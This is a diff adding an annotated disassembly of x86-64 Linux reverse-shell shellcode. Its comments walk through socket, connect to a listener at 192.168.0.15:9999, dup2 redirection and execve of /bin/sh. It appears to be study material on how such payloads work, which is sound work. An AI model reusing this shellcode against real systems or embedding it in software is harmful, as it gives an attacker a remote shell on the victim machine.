@@ -1,0 +1,47 @@
+0x0000000000601060 <+0>:   push   0x29    ; push 41 (the 'socket' SYSCALL number in decimal) onto the stack
+0x0000000000601062 <+2>:   pop    rax     ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601063 <+3>:   cdq            ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0, RDX needs to contain the third SYS_SOCKET protocol argument value of '0'    
+0x0000000000601064 <+4>:   push   0x2     ; push 2 onto the stack
+0x0000000000601066 <+6>:   pop    rdi     ; pop that value into RDI (the first SYS_SOCKET argument value of 'PF_INET' - '2')
+0x0000000000601067 <+7>:   push   0x1     ; push 1 onto the stack
+0x0000000000601069 <+9>:   pop    rsi     ; pop that value into RSI (the second SYS_SOCKET argument value of 'SOCK_STREAM' - '1')
+0x000000000060106a <+10>:  syscall        ; issue the 'socket' syscall
+
+
+0x000000000060106c <+12>:  xchg   rdi,rax                ; the syscall will return the socket file descriptor value into RAX, so move that value into RDI to be used for later 
+0x000000000060106e <+14>:  movabs rcx,0xf00a8c00f270002  ; move the following HEX values into RCX as a QWORD:
+
+0002 (the first WORD value of the 'addr' struct, which is 'AF_INET/sin_family' - '2')
+0f27 (the second WORD value of the 'addr' struct - decimal number 3879 (big-endian) or 9999 (little-endian), which is the listener port
+f00a8c0 (the third DWORD value of the 'addr' struct, which is 'inet_addr("192.168.0.15")/sin_addr'). The 4 HEX bytes are c0 (192 in decimal), a8 (168 in decimal), 00 (0 in decimal) and 0f (15 in decimal) - this is the listener IP address of 192.168.0.15
+
+0x0000000000601078 <+24>:  push   rcx       ; push all three values of the 'addr' struct onto the stack                         
+0x0000000000601079 <+25>:  mov    rsi,rsp   ; move the second SYS_CONNECT protocol argument value of '(struct sockaddr *)&addr' - the pointer to the three 'addr' struct values into RSI
+0x000000000060107c <+28>:  push   0x10      ; push the third SYS_CONNECT protocol argument value of 'sizeof(addr)' - '16' (in decimal) onto the stack
+0x000000000060107e <+30>:  pop    rdx       ; pop that value into RDX
+0x000000000060107f <+31>:  push   0x2a      ; push 42 (the 'connect' SYSCALL number in decimal) onto the stack
+0x0000000000601081 <+33>:  pop    rax       ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601082 <+34>:  syscall          ; issue the 'connect' syscall
+
+
+
+0x0000000000601084 <+36>:  push   0x3      ; push 3 onto the stack
+0x0000000000601086 <+38>:  pop    rsi      ; pop that value into RSI 
+0x0000000000601087 <+39>:  dec    rsi      ; decrease the value of RSI to 2 - STDERR in the 'dup2' SYSCALL
+0x000000000060108a <+42>:  push   0x21     ; push the 'dup2' syscall number 33 (0x21 in HEX) onto the stack
+0x000000000060108c <+44>:  pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x000000000060108d <+45>:  syscall         ; issue the 'dup2' syscall
+0x000000000060108f <+47>:  jne    0x601087 <code+39>   ; jump back to the 0x601087 address where another dup2 syscall is being setup for STDOUT - 1 and then STDIN - 0, unless the zero flag (ZF) is set. If the zero flag is set (e.g. RSI is 0), proceed to the next instruction
+
+
+
+0x0000000000601091 <+49>:  push   0x3b     ; push the 'execve' syscall number 59 (0x3B in HEX) onto the stack
+0x0000000000601093 <+51>:  pop    rax      ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601094 <+52>:  cdq             ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0, RDX needs to point to a memory address containing '0x0000000000000000'. RDX is the 3rd arg (char *const envp[]) of the 'execve' syscall    
+0x0000000000601095 <+53>:  movabs rbx,0x68732f6e69622f   ; move the 'hs/nib/' value (ASCII) into RBX in reverse (little-endian)
+0x000000000060109f <+63>:  push   rbx      ; push that value onto the stack
+0x00000000006010a0 <+64>:  mov    rdi,rsp  ; RSP is now pointing to a memory address containing the begining of our string (/bin/sh) + 00, so move this memory address into RDI. RDI is the 1st arg (const char *filename) of the 'execve' syscall
+0x00000000006010a3 <+67>:  push   rdx      ; push 0 onto the stack
+0x00000000006010a4 <+68>:  push   rdi      ; push the memory address of the /bin/sh string onto the stack
+0x00000000006010a5 <+69>:  mov    rsi,rsp  ; move this memory address (the string + 0x0000000000000000) from RSP into RSI. RSI is the 2nd arg (char *const argv[]) of the 'execve' syscall
+0x00000000006010a8 <+72>:  syscall         ; issue the 'execve' syscall
